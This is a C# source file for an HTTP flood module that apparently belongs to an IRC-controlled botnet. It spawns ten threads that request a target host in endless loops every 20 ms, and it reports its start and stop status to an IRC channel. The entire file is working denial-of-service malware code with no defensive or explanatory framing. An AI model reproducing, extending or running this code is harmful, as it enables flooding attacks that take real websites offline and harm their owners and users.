using System;
using System.Net;
using System.Threading;


namespace myApp
{
    internal class HttpFlood
    {
        private static ThreadStart[] _floodingJob;
        private static Thread[] _floodingThread;
        public static string Host;
        public static int Interval = 20;
        public static bool IsEnabled;
        private static HttpRequest[] _requestClass;
        public static int Threads = 10;

        public static void StartHttpFlood()
        {
            _floodingThread = new Thread[Threads];
            _floodingJob = new ThreadStart[Threads];
            _requestClass = new HttpRequest[Threads];
            for (int i = 0; i < Threads; i++)
            {
                _requestClass[i] = new HttpRequest(Host, Interval);
                _floodingJob[i] = new ThreadStart(_requestClass[i].Send);
                _floodingThread[i] = new Thread(_floodingJob[i]);
                _floodingThread[i].Start();
            }
            IsEnabled = true;
            Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  8httpflood 9started on " + Host);
        }

        public static void StopHttpFlood()
        {
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    _floodingThread[i].Abort();
                    _floodingThread[i] = null;
                    _floodingJob[i] = null;
                    _requestClass[i] = null;
                }
                catch (Exception p)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  " + p);
                    Program.Writer.Flush();
                    Thread.Sleep(5000);
                }
            }
            IsEnabled = false;
            Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  8HTTP flood 9stopped");
        }

        #region Nested type: HttpRequest

        private class HttpRequest
        {
            private string Host;
            private WebClient Http = new WebClient();
            private int Interval;

            public HttpRequest(string Host, int Interval)
            {
                this.Host = Host;
                this.Interval = Interval;
            }

            public void Send()
            {
                while (true)
                {
                    try
                    {
                        Http.DownloadString(Host);
                        Thread.Sleep(Interval);
                    }
                    catch
                    {
                        Thread.Sleep(Interval);
                    }
                }
            }
        }

        #endregion
    }
}